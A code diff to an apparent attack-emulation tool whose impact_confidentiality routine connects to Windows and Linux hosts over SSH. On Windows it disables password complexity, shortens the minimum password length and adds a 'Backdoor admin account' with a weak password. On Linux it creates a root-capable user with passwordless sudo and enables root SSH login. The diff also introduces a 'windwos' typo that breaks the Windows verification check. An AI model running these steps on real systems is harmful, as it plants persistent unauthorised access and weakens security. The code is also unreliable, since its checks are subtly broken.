@@ -6,7 +6,7 @@ import socket
 import time
 
 # Verbose output flag
-verbose = True
+verbose = False
 
 
 #
@@ -262,9 +262,10 @@ OUTER
         else:
             stdout, stderr, exit_status = shell.execute_cmd(cmd, verbose=verbose)
 
-        print(f"stdout={stdout}")
-        print(f"stderr={stderr}")
-        print(f"exit_status={stderr}")
+        if verbose:
+            print(f"stdout={stdout}")
+            print(f"stderr={stderr}")
+            print(f"exit_status={stderr}")
         result["cmd"] = cmd
         result["stdout"] = stdout
         result["stderr"] = stderr
@@ -305,8 +306,8 @@ def impact_confidentiality(node: dict, enterprise: dict) -> dict:
     domain_leaders = enterprise['enterprise_built']['setup']['setup_domains']['domain_leaders']
     domain_details = domain_leaders[domain]
 
-    user = 'ubuntu' if 'linux' in node['roles'] else 'administrator'
-    password = None if 'linux' in node['roles'] else domain_details['admin_pass']
+    user = 'ubuntu' if 'linux' in node_desc['roles'] else 'administrator'
+    password = None if 'linux' in node_desc['roles'] else domain_details['admin_pass']
 
     result = {
         "cmd": None,
@@ -322,15 +323,21 @@ def impact_confidentiality(node: dict, enterprise: dict) -> dict:
         shell = ShellHandler(control_ip, user, password, verbose=verbose)
 
         if 'windows' in node_desc['roles']:
-            cmd = """
-$username = 'impactadmin';
-$password = ConvertTo-SecureString 'pwned' -AsPlainText -Force;
-if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
-    New-LocalUser -Name $username -Password $password -FullName 'Impact Admin' -Description 'Backdoor admin account'
-};
-Add-LocalGroupMember -Group 'Administrators' -Member $username;
-Write-Output '[confidentiality access enabled]'
-"""
+            cmd = (
+                "secedit /export /cfg secconfig.cfg;"
+                "(Get-Content secconfig.cfg) -replace 'PasswordComplexity\s*=\s*1', 'PasswordComplexity = 0' |"
+                "    Set-Content secconfig-mod.cfg;"
+                "secedit /configure /db secedit.sdb /cfg secconfig-mod.cfg /areas SECURITYPOLICY;"
+                "Remove-Item secconfig.cfg, secconfig-mod.cfg, secedit.sdb;"
+                "net accounts /minpwlen:4;"
+                "$username = 'impactadmin'; "
+                "$password = ConvertTo-SecureString 'pwned' -AsPlainText -Force; "
+                "if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) { "
+                "    New-LocalUser -Name $username -Password $password -FullName 'Impact Admin' -Description 'Backdoor admin account' "
+                "}; "
+                "net localgroup Administrators impactadmin /add ; "
+                "Write-Output '[confidentiality access enabled]' "
+            )
             verify_tag = "[confidentiality access enabled]"
             stdout, stderr, exit_status = shell.execute_powershell(cmd)
             result["verified"] = exit_status == 0 and verify_tag.lower() in str(stdout + stderr).lower()
@@ -345,9 +352,11 @@ echo "[impact_confidentiality] creating impactroot user and enabling SSH access"
 if ! id impactroot &>/dev/null; then
     sudo useradd -m impactroot
 fi
-echo 'impactroot:pwned' | sudo chpasswd
+echo 'impactroot:pwned' | sudo chpasswd --crypt-method=SHA512
 sudo usermod -aG sudo impactroot
 sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+echo 'impactroot ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/impactroot
+sudo chmod 440 /etc/sudoers.d/impactroot
 sudo systemctl restart ssh
 echo "[confidentiality access enabled]"
 EOF
@@ -367,22 +376,18 @@ OUTER
         return result
 
     try:
-        if 'windows' in node_desc['roles']:
+        if 'windwos' in node_desc['roles']:
             impact_shell = ShellHandler(control_ip, 'impactadmin', 'pwned', verbose=verbose)
-            cmd = """
-if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Output 'impactadmin has administrative privileges.'
-} else {
-    Write-Output 'impactadmin does NOT have administrative privileges.'
-}
-"""
+            cmd = (
+                "if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Write-Output 'impactadmin has administrative privileges.' } else { Write-Output 'impactadmin does NOT have administrative privileges.' }"
+            )
             check_out, check_err, check_code = impact_shell.execute_powershell(cmd)
             result["verified"] = check_code == 0 and "administrative privileges" in check_out
 
         elif 'linux' in node_desc['roles']:
             impact_shell = ShellHandler(control_ip, 'impactroot', 'pwned', verbose=verbose)
             check_out, check_err, check_code = impact_shell.execute_cmd("sudo cat /etc/passwd")
-            result["verified"] = check_code == 0 and check_out.strip() != ""
+            result["verified"] = check_code == 0 and str(check_out).strip() != ""
 
     except paramiko.SSHException as e:
         result["error"] = str(e)
